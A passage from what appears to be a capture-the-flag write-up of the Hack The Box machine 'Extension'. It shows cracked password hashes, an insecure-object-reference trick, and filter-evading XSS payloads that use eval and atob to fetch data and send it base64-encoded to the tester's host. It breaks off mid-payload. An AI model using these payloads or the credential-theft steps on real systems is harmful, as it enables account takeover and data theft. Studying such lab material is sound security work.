<span id="cb7-4">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span>: 1,</span>
<span id="cb7-5">        <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"name":</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"Charlie</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Rooper</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-6"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">charlie@snippet.htb</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email_verified_at</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-01-02</span> 20:12:46<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>password<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>remember_token<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>T8hTcYuS7ULTi73eYg7ZHhncyNucDKQb3VaUDfcotdEGaDESr3YsP9xUlJEQ<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>created_at<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>2022-01-02 20:12:47<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>updated_at<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>2022-06-20 14:46:28<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb7-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>user_type<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>Manager<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span></span></code></pre></div>
<p>Jean that we also found earlier is a member, her hash/token/information might come in handy later on.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension cat snippet_users.json <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a10</span> jean</span>
<span id="cb8-2">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb8-3">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> 664,</span>
<span id="cb8-4">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Jean Castux"</span>,</span>
<span id="cb8-5">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jean@snippet.htb"</span>,</span>
<span id="cb8-6">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email_verified_at"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-01-02 20:15:30"</span>,</span>
<span id="cb8-7">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6"</span>,</span>
<span id="cb8-8">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"remember_token"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"naXzYffXKP"</span>,</span>
<span id="cb8-9">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"created_at"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-01-02 20:15:37"</span>,</span>
<span id="cb8-10">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"updated_at"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-01-02 20:15:37"</span>,</span>
<span id="cb8-11">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user_type"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Member"</span></span>
<span id="cb8-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">},</span></span></code></pre></div>
<p>Trying to crack all hashes we only get one hit:</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension grep password snippet_users.json <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">awk</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-F\"</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'{print $4}'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> tmp_hashes</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension grep <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'email"'</span> snippet_users.json <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">awk</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-F\"</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'{print $4}'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> tmp_email</span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension paste <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">":"</span> tmp_email tmp_hashes <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> snippet_users.hash</span>
<span id="cb9-4"></span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m1400</span> snippet_users.hash /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span></span>
<span id="cb9-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb9-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
<span id="cb9-8"></span>
<span id="cb9-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m1400</span> snippet_users.hash /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--show</span></span>
<span id="cb9-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">letha@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
<span id="cb9-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fredrick@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
<span id="cb9-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gia@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
<span id="cb9-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">juliana@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span></code></pre></div>
<p>Testing to login with credentials <code>letha@snippet.htb:password123</code> and we gain access to the application:</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension07.png" class="img-fluid"></p>
<p>Browsing snippets we find one public (<code>http://snippet.htb/snippets/1</code>) from <em>Isaac Heller</em> named <em>“JavaScript get clipboard”</em>:</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode js code-with-copy"><code class="sourceCode javascript"><span id="cb10-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">function</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getClipBoard</span>() {</span>
<span id="cb10-2">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">const</span> el <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">document</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">createElement</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"div"</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-3">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">document</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">body</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">appendChild</span>(el)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-4">    el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">contentEditable</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-5">    el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">style</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> {<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">position</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'absolute'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">left</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-9999px'</span>}<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-6"></span>
<span id="cb10-7">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">const</span> range <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">document</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">createRange</span>()<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-8">    range<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selectNode</span>(el)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-9">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">window</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getSelection</span>()<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">removeAllRanges</span>()<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-10">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">window</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getSelection</span>()<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">addRange</span>(range)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-11">    el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">focus</span>()<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-12">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">document</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">execCommand</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"paste"</span>)<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-13">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">innerHTML</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-14">}</span></code></pre></div>
<p>Browsing to <code>http://snippet.htb/snippets/2</code> we find another snippet from <strong>Jean</strong> named <em>“Gitea API”</em>, however we’re not authorized to view it.</p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>The application is vulnerable to a pretty simple exploit where we utilize the edit function. Create a new snippet, the content is irrelevant, and head over to <em>Browse Snippets</em>. Press edit and <em>UPDATE</em> without editing to capture the POST request in Burp.</p>
<p>The post body will look something like this:</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb11-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">"name"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sdf"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">"content"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"I only write in D"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">"language"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"D"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">"public"</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">:</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">true</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>Now simply remove everything except <code>"public":true</code> and change the address from <code>/snippets/update/&lt;id&gt;</code> to <code>/snippets/update/2</code> to make Jean’s snippet public.</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension08.png" class="img-fluid"></p>
<p>Decode the token to reveal Jeans credentials:</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension echo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span></span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean:EHmfar1Y7ppA9O5TAIXnYnJpA</span></span></code></pre></div>
<p>With Jeans credentials we’re now able to access her email (<code>mail.snippet.htb</code>) and git (<code>dev.snippet.htb</code>), however SSH only accepts publickey.</p>
<p>Logging into git we find an extension designed display the body of issues posted on internal repos, meaning we can post data that will be read by other team members. Looking through the code (<code>inject.js</code>) we find this filter in the end:</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">function</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;"> check</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">str</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb13-2">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//</span> remove tags</span>
<span id="cb13-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">str</span> = str.replace<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>.<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>/, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb13-4"></span>
<span id="cb13-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">const</span> filter = [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">";"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"\'"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"("</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">")"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"src"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"script"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&amp;"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"|"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"["</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"]"</span>]</span>
<span id="cb13-6"></span>
<span id="cb13-7">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">const</span> i of filter<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb13-8">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">str.includes</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">i</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span>
<span id="cb13-9">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span></span>
<span id="cb13-10">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb13-11">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">str</span></span>
<span id="cb13-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span></code></pre></div>
<p>The first <code>&lt;&gt;</code> tag is replaced with <code>""</code>, this only happens once since it’s not in a loop. Other then that, a bunch of words and characters are also filtered. The big thing here is the semi-colon as it removes most of the “standard” ways to steal cookies.</p>
<p>To test if we can get this XSS to work, I use this simple payload and wait for callbacks. <code>&lt;replace-me&gt;&lt;img sRc="http://10.10.14.10?c=hello.xss" /&gt;</code></p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80</span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://0.0.0.0:80/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb14-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.14.10</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [08/Sep/2022 14:28:28] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /?c=hello.xss HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [08/Sep/2022 14:30:32] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /?c=hello.xss HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>Now we just need to figure out what to steal, and how to do it.</p>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Here we have a few rules to follow, no parentheses and no semi colons. Googling around for <em>XSS without parentheses</em> I come across <a href="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md">this gold mine</a> or different XSS payloads. With a lot of trial and error and over 100+ tries later I finally succeed to find a payload that allows me to <code>fetch()</code> with my XSS:</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Payload to b64 encode</span></span>
<span id="cb15-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fetch</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'http://10.10.14.10/just-fetch'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb15-3"></span>
<span id="cb15-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Issues body</span></span>
<span id="cb15-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>remove-me<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>img <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">sRc</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"e"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">onerror</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>eval.call<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9qdXN0LWZldGNoJykK`\x29"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb15-6"></span>
<span id="cb15-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## HTTP Server</span></span>
<span id="cb15-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [09/Sep/2022 14:30:53] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /just-fetch HTTP/1.1"</span> 404 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>Expanding on the PoC I try to fetch the content of text file that I host, and then fetch again to “send” the data base64 encoded in the URL.</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fetch('http://10.10.14.10/employees.txt').then(response =&gt; response.text()).then(data =&gt; fetch('http://10.10.14.10/'+btoa(data)))"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span></span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9</span></span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEw</span></span>
<span id="cb16-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">LycrYnRvYShkYXRhKSkpCg</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>=</span>
<span id="cb16-5"></span>
<span id="cb16-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Issues body</span></span>
<span id="cb16-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>remove-me<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>img <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">sRc</span><span class="op" style="color: #5E5E5E;
background-color: null;
